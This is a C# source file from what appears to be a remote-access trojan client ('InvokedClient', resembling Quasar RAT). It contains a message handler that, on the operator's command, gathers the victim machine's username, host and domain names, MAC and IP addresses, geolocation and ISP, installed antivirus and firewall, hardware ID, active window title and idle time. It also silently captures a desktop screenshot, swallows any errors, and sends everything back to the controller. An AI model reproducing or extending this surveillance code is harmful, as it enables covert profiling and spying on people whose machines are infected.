

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.NetworkInformation;
using InvokedClient.Helper;
using InvokedClient.IO;
using InvokedClient.IpGeoLocation;
using InvokedClient.User;
using InvokedCommon.Messages;
using InvokedCommon.Networking;
using InvokedCommon.Video;
using InvokedCommon.Video.Codecs;


namespace InvokedClient.MessageHandlers
{
	public class SystemInformationHandler : IMessageProcessor
	{
		private static BitmapData desktopData = (BitmapData)null;
		private static Bitmap desktop = (Bitmap)null;
		private static int DefaultMonitor = 0;
		private static int Quality = 35;
		private static bool ShowCursor = true;

		public bool CanExecute(IMessage message)
		{
			return message is GetSystemInfo || message is GetSystemSummaryInfo;
		}

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case GetSystemInfo message1:
					this.Execute(sender, message1);
					break;
				case GetSystemSummaryInfo message2:
					this.Execute(sender, message2);
					break;
			}
		}

		private void Execute(ISender client, GetSystemSummaryInfo message)
		{
			List<Tuple<string, string>> tupleList = new List<Tuple<string, string>>()
	  {
		new Tuple<string, string>("OS:", SystemHelper.GetWindowsVersion()),
		new Tuple<string, string>("CPU:", HardwareDevices.CpuName),
		new Tuple<string, string>("GPU:", HardwareDevices.GpuName),
		new Tuple<string, string>("Memory:", string.Format("{0} MB", (object) HardwareDevices.TotalPhysicalMemory)),
		new Tuple<string, string>("Uptime:", SystemHelper.GetUptime()),
		new Tuple<string, string>("Idle Time:", (SystemHelper.GetIdleTime() / 1000U).ToString() + " seconds"),
		new Tuple<string, string>("Window:", SystemHelper.GetCaptionOfActiveWindow()),
		new Tuple<string, string>("Antivirus:", SystemHelper.GetAntivirus()),
		new Tuple<string, string>("HWID:", SystemHelper.GetHWID())
	  };
			client.Send<GetSystemSummaryInfoResponse>(new GetSystemSummaryInfoResponse()
			{
				SystemSummaryInfos = tupleList
			});
			Rectangle bounds = RemoteDesktopHelper.GetBounds(SystemInformationHandler.DefaultMonitor);
			Resolution resolution = new Resolution()
			{
				Height = bounds.Height,
				Width = bounds.Width
			};
			UnsafeStreamCodec unsafeStreamCodec = new UnsafeStreamCodec(SystemInformationHandler.Quality, SystemInformationHandler.DefaultMonitor, resolution);
			try
			{
				IntPtr zero = IntPtr.Zero;
				RemoteDesktopHelper.SetThreadDesktop(RemoteDesktopHelper.OpenDesktop("Default", 0, true, 511U));
				SystemInformationHandler.desktop = RemoteDesktopHelper.CaptureScreen(SystemInformationHandler.DefaultMonitor, SystemInformationHandler.ShowCursor);
				SystemInformationHandler.desktopData = SystemInformationHandler.desktop.LockBits(new Rectangle(0, 0, SystemInformationHandler.desktop.Width, SystemInformationHandler.desktop.Height), ImageLockMode.ReadWrite, SystemInformationHandler.desktop.PixelFormat);
				using (MemoryStream outStream = new MemoryStream())
				{
					unsafeStreamCodec.CodeImage(SystemInformationHandler.desktopData.Scan0, new Rectangle(0, 0, SystemInformationHandler.desktop.Width, SystemInformationHandler.desktop.Height), new Size(SystemInformationHandler.desktop.Width, SystemInformationHandler.desktop.Height), SystemInformationHandler.desktop.PixelFormat, (Stream)outStream);
					client.Send<GetSystemSummaryDesktopImageResponse>(new GetSystemSummaryDesktopImageResponse()
					{
						Image = outStream.ToArray(),
						Quality = unsafeStreamCodec.ImageQuality,
						Monitor = unsafeStreamCodec.Monitor,
						Resolution = unsafeStreamCodec.Resolution
					});
				}
			}
			catch (Exception ex)
			{
			}
			finally
			{
				if (SystemInformationHandler.desktop != null)
				{
					if (SystemInformationHandler.desktopData != null)
					{
						try
						{
							SystemInformationHandler.desktop.UnlockBits(SystemInformationHandler.desktopData);
						}
						catch
						{
						}
					}
					SystemInformationHandler.desktop.Dispose();
				}
				unsafeStreamCodec.Dispose();
			}
		}

		private void Execute(ISender client, GetSystemInfo message)
		{
			try
			{
				IPGlobalProperties globalProperties = IPGlobalProperties.GetIPGlobalProperties();
				string str1 = !string.IsNullOrEmpty(globalProperties.DomainName) ? globalProperties.DomainName : "-";
				string str2 = !string.IsNullOrEmpty(globalProperties.HostName) ? globalProperties.HostName : "-";
				GeoInformation geoInformation = GeoInformationFactory.GetGeoInformation();
				UserAccount userAccount = new UserAccount();
				List<Tuple<string, string>> tupleList = new List<Tuple<string, string>>()
		{
		  new Tuple<string, string>("Processor (CPU)", HardwareDevices.CpuName),
		  new Tuple<string, string>("Memory (RAM)", string.Format("{0} MB", (object) HardwareDevices.TotalPhysicalMemory)),
		  new Tuple<string, string>("Video Card (GPU)", HardwareDevices.GpuName),
		  new Tuple<string, string>("Username", userAccount.UserName),
		  new Tuple<string, string>("PC Name", SystemHelper.GetPcName()),
		  new Tuple<string, string>("Domain Name", str1),
		  new Tuple<string, string>("Host Name", str2),
		  new Tuple<string, string>("System Drive", Path.GetPathRoot(Environment.SystemDirectory)),
		  new Tuple<string, string>("System Directory", Environment.SystemDirectory),
		  new Tuple<string, string>("Uptime", SystemHelper.GetUptime()),
		  new Tuple<string, string>("MAC Address", HardwareDevices.MacAddress),
		  new Tuple<string, string>("LAN IP Address", HardwareDevices.LanIpAddress),
		  new Tuple<string, string>("WAN IP Address", geoInformation.IpAddress),
		  new Tuple<string, string>("ASN", geoInformation.Asn),
		  new Tuple<string, string>("ISP", geoInformation.Isp),
		  new Tuple<string, string>("Antivirus", SystemHelper.GetAntivirus()),
		  new Tuple<string, string>("Firewall", SystemHelper.GetFirewall()),
		  new Tuple<string, string>("Time Zone", geoInformation.Timezone),
		  new Tuple<string, string>("Country", geoInformation.Country)
		};
				client.Send<GetSystemInfoResponse>(new GetSystemInfoResponse()
				{
					SystemInfos = tupleList
				});
			}
			catch
			{
			}
		}
	}
}